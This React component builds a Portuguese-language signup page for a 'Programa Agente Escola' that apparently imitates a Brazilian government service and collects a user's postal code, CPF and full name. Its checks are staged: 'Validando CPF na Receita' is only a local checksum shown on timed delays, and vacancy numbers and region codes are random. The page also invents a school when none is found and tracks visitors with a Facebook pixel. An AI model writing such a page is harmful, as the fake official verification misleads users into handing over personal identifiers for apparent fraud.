import React, { useState, useEffect } from "react";
import { Check, MapPin, DollarSign, GraduationCap, Award, Search } from "lucide-react";
import { useLocation } from "../context/LocationContext";
import { useUser } from "../context/UserContext";
import ReactPixel from "react-facebook-pixel";
import { hashUserData } from "../utils/pixel";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';
import axios from "axios";

// --- Interfaces ---

interface School {
    id: string;
    name: string;
    type: string;
    distance: number;
}

interface AddressInfo {
    cep: string;
    logradouro: string;
    bairro: string;
    localidade: string;
    uf: string;
    codigoRegiao: string;
    pontoAtendimento: string;
    vagasDisponiveis: number;
    nearbySchools: School[];
}

interface UserInfo {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
}

interface VerificationStep {
    label: string;
    status: "pending" | "processing" | "completed";
}

// --- Funções Utilitárias ---

const calculateDistance = (lat1: number, lon1: number, lat2: number, lon2: number) => {
    const R = 6371; // Raio da Terra em km
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a =
        Math.sin(dLat / 2) * Math.sin(dLat / 2) +
        Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
        Math.sin(dLon / 2) * Math.sin(dLon / 2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    return R * c;
};

// --- Validações e APIs ---

const validateCEP = async (cep: string) => {
    try {
        // 1. Obter dados da BrasilAPI v2 (já inclui coordenadas)
        const brasilApiResponse = await axios.get(`https://brasilapi.com.br/api/cep/v2/${cep}`);
        
        if (!brasilApiResponse.data || !brasilApiResponse.data.location) {
             // Fallback caso a V2 não retorne coordenadas, tentamos pegar só o endereço e dar erro de location
             if(brasilApiResponse.data.street) throw new Error("Coordenadas não encontradas para este CEP");
             throw new Error("CEP não encontrado");
        }

        const { street, neighborhood, city, state, location } = brasilApiResponse.data;
        const lat = location.coordinates.latitude;
        const lon = location.coordinates.longitude;

        // 2. Buscar escolas usando Overpass API (OpenStreetMap) com as coordenadas da BrasilAPI
        const overpassQuery = `
            [out:json][timeout:25];
            (
                node["amenity"="school"](around:5000,${lat},${lon});
                way["amenity"="school"](around:5000,${lat},${lon});
                relation["amenity"="school"](around:5000,${lat},${lon});
            );
            out body;
            >;
            out skel qt;
        `;

        let schools: School[] = [];

        try {
            const overpassResponse = await axios.post(
                'https://overpass-api.de/api/interpreter',
                overpassQuery,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );

            schools = overpassResponse.data.elements
                .filter((element: any) => element.tags && element.tags.name)
                .map((element: any) => ({
                    id: element.id.toString(),
                    name: element.tags.name,
                    type: element.tags.school_type || 'Escola pública',
                    distance: calculateDistance(lat, lon, element.lat || lat, element.lon || lon)
                }))
                .sort((a: School, b: School) => a.distance - b.distance)
                .slice(0, 3);
        } catch (err) {
            console.warn("Erro ao buscar escolas no Overpass, usando fallback genérico", err);
            // Fallback silencioso para não travar o fluxo se o Overpass falhar
        }

        // Se não encontrar escolas próximas, cria uma genérica baseada no bairro
        if (schools.length === 0) {
            schools.push({
                id: "generic-1",
                name: `Escola Municipal de ${neighborhood || city}`,
                type: "Escola Pública",
                distance: 1.5
            });
        }

        return {
            address: {
                logradouro: street,
                bairro: neighborhood,
                localidade: city,
                uf: state
            },
            schools,
            coordinates: { lat, lon }
        };
    } catch (error) {
        console.error('Erro ao buscar dados de localização:', error);
        throw error;
    }
};

const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
    const numericCPF = cpf.replace(/\D/g, "");

    if (numericCPF.length !== 11) return { valid: false };
    if (/^(\d)\1{10}$/.test(numericCPF)) return { valid: false };

    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(numericCPF.charAt(i)) * (10 - i);
    let digit1 = 11 - (sum % 11);
    if (digit1 > 9) digit1 = 0;

    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(numericCPF.charAt(i)) * (11 - i);
    let digit2 = 11 - (sum % 11);
    if (digit2 > 9) digit2 = 0;

    if (parseInt(numericCPF.charAt(9)) !== digit1 || parseInt(numericCPF.charAt(10)) !== digit2) {
        return { valid: false };
    }

    // OBSERVAÇÃO: A BrasilAPI (gratuita) NÃO retorna dados pessoais (Nome, Mãe) por questões de LGPD.
    // O código abaixo valida apenas matematicamente e retorna sucesso para liberar o formulário manual.
    // Se você tiver uma chave de API paga que retorne dados, insira a chamada aqui.
    
    return { 
        valid: true,
        // Retornamos dados vazios para que o usuário preencha
        data: {
            cpf: numericCPF,
            nome: "", 
            nome_mae: "",
            data_nascimento: "",
            sexo: ""
        }
    };
};

// --- Componente Principal ---

const Inscription: React.FC = () => {
    usePixelTracking();
    
    const navigate = useUtmNavigator();
    const [cep, setCep] = useState("");
    const [cpf, setCpf] = useState("");
    const [addressInfo, setAddressInfo] = useState<AddressInfo | null>(null);
    const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [acceptedTerms, setAcceptedTerms] = useState(false);
    
    // Passos de verificação ajustados já que não buscamos dados profundos automaticamente
    const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>([
        { label: "Validando CPF na Receita", status: "pending" },
        { label: "Verificando Elegibilidade", status: "pending" },
        { label: "Liberando Formulário", status: "pending" },
    ]);
    
    const [isVerifying, setIsVerifying] = useState(false);
    const [verificationComplete, setVerificationComplete] = useState(false);
    const [name, setName] = useState("");

    const { setLocationInfo } = useLocation();
    const { setUserName } = useUser();

    const [showVerifyingPopup, setShowVerifyingPopup] = useState(false);
    const [showAvailablePopup, setShowAvailablePopup] = useState(false);
    const [currentStep, setCurrentStep] = useState(0);

    useEffect(() => {
        ReactPixel.init("617874301266607");
        ReactPixel.track("PageView", {
            event_name: "PageView",
            event_time: Math.floor(Date.now() / 1000),
            event_id: "PageView_" + Date.now(),
            action_source: "website",
            user_data: hashUserData({}),
            custom_data: { currency: "BRL", value: 0, num_items: 1 },
        });
    }, []);

    const formatCEP = (value: string) => {
        const numbers = value.replace(/\D/g, "");
        if (numbers.length <= 5) return numbers;
        return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`;
    };

    const formatCPF = (value: string) => {
        const numbers = value.replace(/\D/g, "");
        if (numbers.length <= 3) return numbers;
        if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
        if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
        return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
    };

    const handleCEPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const formatted = formatCEP(e.target.value);
        if (formatted.length <= 9) {
            setCep(formatted);
        }
    };

    const validateCEPAndFindSchools = async () => {
        setLoading(true);
        setError("");
        setAddressInfo(null);
        setShowVerifyingPopup(true);
        setCurrentStep(0);

        try {
            const cleanCEP = cep.replace(/\D/g, "");
            
            await new Promise(resolve => setTimeout(resolve, 1500));
            setCurrentStep(1);
            
            const locationData = await validateCEP(cleanCEP);
            
            setCurrentStep(2);
            await new Promise(resolve => setTimeout(resolve, 1000));

            const addressInfo: AddressInfo = {
                cep: cleanCEP,
                logradouro: locationData.address.logradouro,
                bairro: locationData.address.bairro,
                localidade: locationData.address.localidade,
                uf: locationData.address.uf,
                codigoRegiao: `${locationData.address.uf}-${Math.floor(Math.random() * 90 + 10)}-${Math.floor(Math.random() * 900 + 100)}`,
                pontoAtendimento: locationData.schools[0]?.name || "Unidade Central",
                vagasDisponiveis: Math.floor(Math.random() * 30) + 5, // Vagas mais realistas
                nearbySchools: locationData.schools
            };

            setAddressInfo(addressInfo);
            setLocationInfo(cleanCEP, locationData.schools);
            
            setShowVerifyingPopup(false);
            await new Promise(resolve => setTimeout(resolve, 500));
            setShowAvailablePopup(true);
            await new Promise(resolve => setTimeout(resolve, 3000));
            setShowAvailablePopup(false);

        } catch (err) {
            setError("CEP não encontrado. Verifique o número e tente novamente.");
            setShowVerifyingPopup(false);
        } finally {
            setLoading(false);
        }
    };

    const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const formatted = formatCPF(e.target.value);
        if (formatted.length <= 14) {
            setCpf(formatted);
        }
        setVerificationComplete(false);
        setIsVerifying(false);
        setVerificationSteps((steps) => steps.map((step) => ({ ...step, status: "pending" })));
    };

    const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const newName = e.target.value;
        setName(newName);
        setUserName(newName);
    };

    const updateVerificationStep = async (index: number) => {
        setVerificationSteps((steps) =>
            steps.map((step, i) => ({
                ...step,
                status: i === index ? "processing" : step.status,
            })),
        );

        await new Promise((resolve) => setTimeout(resolve, 600));

        setVerificationSteps((steps) =>
            steps.map((step, i) => ({
                ...step,
                status: i <= index ? "completed" : step.status,
            })),
        );
    };

    const validateCPF = async () => {
        setLoading(true);
        setError("");
        setIsVerifying(true);
        setVerificationComplete(false);

        try {
            for (let i = 0; i < verificationSteps.length; i++) {
                await updateVerificationStep(i);
            }

            const result = await validateCPFFromAPI(cpf);

            if (!result.valid) {
                throw new Error("CPF inválido");
            }

            setVerificationComplete(true);
            if (result.data) {
                setUserInfo(result.data);
                // Como não temos o nome vindo da API Brasil gratuita, não setamos o nome automaticamente
                // setName(result.data.nome); 
                setAcceptedTerms(true);
            }
        } catch (err) {
            setError("CPF inválido ou irregular. Tente novamente.");
            setVerificationComplete(false);
            setIsVerifying(false);
            setVerificationSteps((steps) => steps.map((step) => ({ ...step, status: "pending" })));
        } finally {
            setLoading(false);
        }
    };

    const handleSubmit = () => {
        if (addressInfo && acceptedTerms && name.length > 3) {
            navigate("/programa");
        } else if (name.length <= 3) {
            alert("Por favor, preencha seu nome completo.");
        }
    };

    return (
        <main className="container mx-auto px-4 py-4 flex-grow">
            {showVerifyingPopup && (
                <div className="fixed top-0 left-0 right-0 bg-white shadow-lg z-50 animate-slideDown">
                    <div className="max-w-2xl mx-auto p-4">
                        <div className="flex items-center gap-4">
                            <div className="w-8 h-8">
                                <div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
                            </div>
                            <div>
                                <h2 className="text-lg font-semibold">
                                    {currentStep === 0 ? "Conectando ao sistema..." : 
                                     currentStep === 1 ? "Buscando localização..." : "Verificando vagas..."}
                                </h2>
                                <p className="text-sm text-gray-600">
                                    Aguarde enquanto consultamos a base de dados.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Available Popup */}
            {showAvailablePopup && addressInfo && (
                <div className="fixed top-0 left-0 right-0 bg-green-50 shadow-lg z-50 animate-slideDown">
                    <div className="max-w-2xl mx-auto p-4">
                        <div className="flex items-center gap-4">
                            <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                                <Check className="w-5 h-5 text-green-500" />
                            </div>
                            <div>
                                <h2 className="text-lg font-semibold">Vagas Encontradas!</h2>
                                <p className="text-sm text-gray-600">
                                    Região de {addressInfo.bairro} habilitada com {addressInfo.vagasDisponiveis} oportunidades.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            <div className="max-w-lg mx-auto">
                <div className="mb-6">
                    <h1 className="text-[#1351B4] text-2xl font-bold">Programa Agente Escola</h1>
                    <div className="h-1 w-48 bg-[#2ECC71] mt-2"></div>
                </div>

                <div className="bg-white rounded-lg p-6 shadow-sm">
                    <div className="mb-8">
                        <h2 className="text-xl font-bold mb-3">Verificação de Disponibilidade</h2>
                        <p className="text-[#505A5F] text-base">
                            Para iniciar sua inscrição, digite seu CEP para localizar as unidades escolares participantes.
                        </p>
                    </div>

                    <div className="mb-6">
                        <label htmlFor="cep" className="block text-lg font-bold mb-2">CEP</label>
                        <input
                            type="text"
                            id="cep"
                            inputMode="numeric"
                            pattern="\d*"
                            placeholder="00000-000"
                            value={cep}
                            onChange={handleCEPChange}
                            maxLength={9}
                            className="w-full p-4 border-2 border-[#1351B4] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
                        />
                    </div>

                    <button
                        onClick={validateCEPAndFindSchools}
                        disabled={loading || cep.length < 9}
                        className="w-full bg-[#1351B4] text-white py-4 rounded-lg flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        <Search size={20} />
                        <span className="font-semibold">Consultar Vagas</span>
                    </button>

                    {error && <div className="mt-6 p-4 bg-red-50 border-l-4 border-red-500 text-red-700">{error}</div>}

                    {addressInfo && (
                        <>
                            <div className="mt-8 p-6 border border-green-200 rounded-lg bg-green-50">
                                <h2 className="text-2xl font-bold text-green-700 mb-6">Região Habilitada!</h2>
                                <div className="space-y-3 mb-6 text-sm text-gray-700">
                                    <p><span className="font-bold">Cidade:</span> {addressInfo.localidade}/{addressInfo.uf}</p>
                                    <p><span className="font-bold">Bairro:</span> {addressInfo.bairro}</p>
                                    <p><span className="font-bold">Logradouro:</span> {addressInfo.logradouro}</p>
                                    <p><span className="font-bold">Unidade de Ref.:</span> {addressInfo.pontoAtendimento}</p>
                                </div>
                            </div>

                            <div className="mt-8 bg-white rounded-lg p-6 border-t">
                                <h2 className="text-[#1351B4] text-2xl font-bold mb-2">Dados do Candidato</h2>
                                <p className="text-gray-600 mb-6">
                                    Insira seu CPF para validar sua elegibilidade.
                                </p>

                                {verificationComplete ? (
                                    <>
                                        <div className="mb-6 bg-blue-50 p-4 rounded-lg border border-blue-100">
                                            <div className="flex items-center gap-2 mb-2">
                                                <Check className="text-green-600" size={20}/>
                                                <h3 className="text-[#1351B4] font-bold">CPF Validado</h3>
                                            </div>
                                            <p className="text-sm text-gray-600">
                                                Prossiga preenchendo seu nome completo abaixo.
                                            </p>
                                        </div>

                                        <div className="space-y-6 animate-fadeIn">
                                            <div>
                                                <label className="block text-sm font-medium text-gray-700 mb-1">CPF</label>
                                                <input
                                                    type="text"
                                                    value={formatCPF(cpf)}
                                                    disabled
                                                    className="w-full p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-500"
                                                />
                                            </div>

                                            <div>
                                                <label className="block text-sm font-medium text-gray-700 mb-1">Nome Completo</label>
                                                <input
                                                    type="text"
                                                    value={name}
                                                    onChange={handleNameChange}
                                                    placeholder="Digite seu nome completo conforme RG"
                                                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
                                                />
                                            </div>

                                            <div className="flex items-start gap-2 mt-6">
                                                <input
                                                    type="checkbox"
                                                    id="terms"
                                                    checked={acceptedTerms}
                                                    onChange={(e) => setAcceptedTerms(e.target.checked)}
                                                    className="mt-1 w-4 h-4"
                                                />
                                                <label htmlFor="terms" className="text-sm text-gray-600">
                                                    Li e concordo com os termos de uso e declaro que as informações acima são verdadeiras.
                                                </label>
                                            </div>

                                            <button
                                                onClick={handleSubmit}
                                                disabled={!acceptedTerms || name.length < 5}
                                                className="w-full bg-[#2ECC71] text-white py-4 rounded-full flex items-center justify-center gap-2 hover:bg-[#27ae60] transition-colors disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
                                            >
                                                <span className="font-bold text-lg">Finalizar Inscrição</span>
                                            </button>
                                        </div>
                                    </>
                                ) : (
                                    <div className="mb-6">
                                        <div className="flex gap-2">
                                            <input
                                                type="text"
                                                inputMode="numeric"
                                                pattern="\d*"
                                                placeholder="CPF (apenas números)"
                                                value={cpf}
                                                onChange={handleCPFChange}
                                                maxLength={14}
                                                className="flex-1 p-4 border-2 border-[#1351B4] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4]"
                                            />
                                            <button
                                                onClick={validateCPF}
                                                disabled={loading || cpf.replace(/\D/g, '').length < 11}
                                                className="bg-[#1351B4] text-white p-4 rounded-lg hover:bg-[#1351B4]/90 disabled:opacity-50"
                                            >
                                                <Search size={24} />
                                            </button>
                                        </div>

                                        {isVerifying && (
                                            <div className="mt-6 p-6 bg-gray-50 rounded-lg">
                                                <div className="space-y-4">
                                                    {verificationSteps.map((step, index) => (
                                                        <div key={index} className="flex items-center gap-3">
                                                            {step.status === "completed" ? (
                                                                <Check size={18} className="text-green-500" />
                                                            ) : step.status === "processing" ? (
                                                                <div className="w-4 h-4 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                                                            ) : (
                                                                <div className="w-4 h-4 rounded-full border-2 border-gray-300"></div>
                                                            )}
                                                            <span className={`text-sm ${step.status === "completed" ? "text-green-700 font-medium" : "text-gray-500"}`}>
                                                                {step.label}
                                                            </span>
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                )}
                            </div>
                        </>
                    )}
                </div>
            </div>
        </main>
    );
};

export default Inscription;
